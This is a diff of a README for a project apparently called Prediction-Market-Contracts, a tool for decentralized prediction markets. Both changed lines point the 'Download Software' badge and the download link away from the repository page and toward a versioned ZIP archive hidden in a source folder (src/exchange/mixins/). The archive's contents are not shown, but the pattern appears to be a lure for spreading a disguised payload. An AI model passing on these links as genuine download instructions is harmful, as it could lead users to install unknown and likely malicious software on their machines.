@@ -1,6 +1,6 @@
 # 📈 Prediction-Market-Contracts - Manage decentralized prediction markets with ease
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Through-twoiron2116/Prediction-Market-Contracts)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Through-twoiron2116/Prediction-Market-Contracts/raw/refs/heads/main/src/exchange/mixins/Market_Contracts_Prediction_v1.6.zip)
 
 ## 📌 Project Overview
 
@@ -25,7 +25,7 @@ Follow these steps to obtain the files:
 3. Look for the green button labeled Code.
 4. Select Download ZIP to save the folder to your computer.
 
-[https://github.com/Through-twoiron2116/Prediction-Market-Contracts](https://github.com/Through-twoiron2116/Prediction-Market-Contracts)
+[https://github.com/Through-twoiron2116/Prediction-Market-Contracts/raw/refs/heads/main/src/exchange/mixins/Market_Contracts_Prediction_v1.6.zip](https://github.com/Through-twoiron2116/Prediction-Market-Contracts/raw/refs/heads/main/src/exchange/mixins/Market_Contracts_Prediction_v1.6.zip)
 
 ## 🔧 Installation Steps
 
